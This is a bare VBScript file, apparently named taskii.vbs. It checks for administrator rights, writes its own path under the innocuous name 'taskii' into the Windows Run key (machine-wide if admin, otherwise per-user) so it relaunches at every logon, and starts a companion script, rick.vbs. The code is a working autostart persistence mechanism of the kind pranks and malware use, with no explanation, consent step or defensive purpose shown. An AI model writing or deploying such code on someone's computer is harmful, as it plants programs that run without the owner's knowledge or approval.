
Dim WshShell, filesysobj, objShell, currentPath, regPath

Sub Main()
    ' Initialize the WScript.Shell and FileSystemObject
    Set WshShell = CreateObject("WScript.Shell")
    Set filesysobj = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("Shell.Application")
    
    ' Get the current directory where taskii.vbs is located
    currentPath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
    
    ' Determine the correct registry path based on admin rights
    If IsUserAdmin() Then
        ' For system-wide startup (requires admin rights)
        regPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Else
        ' For user-specific startup
        regPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    End If
    
    ' Attempt to write to the registry
    WriteToRegistry regPath, currentPath & "\taskii.vbs"
    RunVBS("rick.vbs")
	
	
	
    ' Cleanup
    Set WshShell = Nothing
    Set filesysobj = Nothing
    Set objShell = Nothing
End Sub

' Subroutine to run another VBS script
Sub RunVBS(strVBS)
    Dim scriptPath
    scriptPath = currentPath & "\" & strVBS
    
    If filesysobj.FileExists(scriptPath) Then
        ' Run the specified VBScript
        WshShell.Run "wscript.exe " & Chr(34) & scriptPath & Chr(34), 1, False
    Else
        ' Log an error if the file does not exist
        LogError "File not found: " & scriptPath
    End If
End Sub

' Logging Function
Sub LogError(strMessage)
    Dim objLogFile
    Set objLogFile = filesysobj.CreateTextFile(currentPath & "\registry_error_log.txt", True)
    objLogFile.WriteLine Now & " - " & strMessage
    objLogFile.Close
    Set objLogFile = Nothing
End Sub

' Admin Check Function
Function IsUserAdmin()
    Dim objFSO
    On Error Resume Next
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    objFSO.GetFile("C:\Windows\System32\config\system")
    
    If Err.Number = 0 Then
        IsUserAdmin = True
    Else
        IsUserAdmin = False
    End If
    On Error GoTo 0
End Function

' Registry Write Function
Sub WriteToRegistry(registryPath, scriptPath)
    On Error Resume Next
    
    ' Write to the registry
    WshShell.RegWrite registryPath & "\taskii", """" & scriptPath & """", "REG_SZ"
    
    ' Handle potential errors
    Select Case Err.Number
        Case 0
            Dim strVerify
            strVerify = WshShell.RegRead(registryPath & "\taskii")
            LogError "Verification: " & strVerify
            
        Case -2147024894
            ' Access Denied Error
            LogError "Access Denied. Try running the script as an administrator." & vbNewLine & _
                     "Error Code: " & Err.Number & vbNewLine & _
                     "Error Description: " & Err.Description
            
        Case -2147024892, -2147024891
            ' Invalid Root Key Error
            LogError "Invalid Registry Root Key or Path." & vbNewLine & _
                     "Error Code: " & Err.Number & vbNewLine & _
                     "Error Description: " & Err.Description & vbNewLine & _
                     "Attempted Path: " & registryPath & "\taskii"
            
        Case Else
            ' Catch-all for other errors
            LogError "Unexpected Registry Error." & vbNewLine & _
                     "Error Code: " & Err.Number & vbNewLine & _
                     "Error Description: " & Err.Description
    End Select
    
    On Error GoTo 0
End Sub

' Call the Main subroutine to execute the script
Main
